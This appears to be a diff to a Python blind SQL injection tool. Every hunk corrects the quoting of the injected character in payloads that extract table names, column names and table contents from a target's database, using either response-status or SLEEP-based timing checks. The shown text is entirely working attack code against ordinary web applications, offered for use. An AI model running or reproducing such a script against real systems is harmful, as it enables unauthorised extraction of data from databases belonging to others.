@@ -67,7 +67,7 @@ while True:
 tablename = ''
 for j in range(i):
     for s in string.ascii_lowercase:
-        sqlpayload = f'''{payload} AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables where table_name like '%{tablenamelike}%'), """+"""{j}, 1)={s},1,0)-- -'''
+        sqlpayload = f'''{payload} AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables where table_name like '%{tablenamelike}%'), """+"""{j}, 1)='{s}',1,0)-- -'''
         response = requests.get(url+sqlpayload)
         if response.status_code == 200:
             tablename += s
@@ -93,7 +93,7 @@ while True:
 tablename = ''
 for j in range(i):
     for s in string.ascii_lowercase:
-        sqlpayload = f'''{payload} AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables where table_name like '%{tablenamelike}%'), """+"""{j}, 1)={s},SLEEP(4),0)-- -'''
+        sqlpayload = f'''{payload} AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables where table_name like '%{tablenamelike}%'), """+"""{j}, 1)='{s}',SLEEP(4),0)-- -'''
         response = requests.get(url+sqlpayload)
         if response.elapsed.total_seconds() > 3:
             tablename += s
@@ -119,7 +119,7 @@ while True:
 columnname = ''
 for j in range(i):
     for s in 'abcdefghijklmnopqrstuvxyz0123456789, ':
-        sqlpayload = f'''{payload} AND IF(SUBSTRING((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns where table_name='{table}'), """+"""{j}, 1)={s},1,0)-- -'''
+        sqlpayload = f'''{payload} AND IF(SUBSTRING((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns where table_name='{table}'), """+"""{j}, 1)='{s}',1,0)-- -'''
         response = requests.get(url+sqlpayload)
         if response.status_code == 200:
             columnname += s
@@ -144,7 +144,7 @@ while True:
 columnname = ''
 for j in range(i):
     for s in 'abcdefghijklmnopqrstuvxyz0123456789, ':
-        sqlpayload = f'''{payload} AND IF(SUBSTRING((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns where table_name='{table}'), """+"""{j}, 1)={s},SLEEP(4),0)-- -'''
+        sqlpayload = f'''{payload} AND IF(SUBSTRING((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns where table_name='{table}'), """+"""{j}, 1)='{s}',SLEEP(4),0)-- -'''
         response = requests.get(url+sqlpayload)
         if response.elapsed.total_seconds() > 3:
             columnname += s
@@ -172,7 +172,7 @@ while True:
 data = ''
 for j in range(i):
     for s in 'abcdefghijklmnopqrstuvxyz0123456789, ':
-        sqlpayload = f'''{payload} AND IF(SUBSTRING((SELECT GROUP_CONCAT({column}) FROM {table}), """+"""{j}, 1)={s},1,0)-- -'''
+        sqlpayload = f'''{payload} AND IF(SUBSTRING((SELECT GROUP_CONCAT({column}) FROM {table}), """+"""{j}, 1)='{s}',1,0)-- -'''
         response = requests.get(url+sqlpayload)
         if response.status_code == 200:
             data += s
@@ -197,7 +197,7 @@ while True:
 data = ''
 for j in range(i):
     for s in 'abcdefghijklmnopqrstuvxyz0123456789, ':
-        sqlpayload = f'''{payload} AND IF(SUBSTRING((SELECT GROUP_CONCAT({column}) FROM {table}), """+"""{j}, 1)={s},SLEEP(4),0)-- -'''
+        sqlpayload = f'''{payload} AND IF(SUBSTRING((SELECT GROUP_CONCAT({column}) FROM {table}), """+"""{j}, 1)='{s}',SLEEP(4),0)-- -'''
         response = requests.get(url+sqlpayload)
         if response.elapsed.total_seconds() > 3:
             data += s
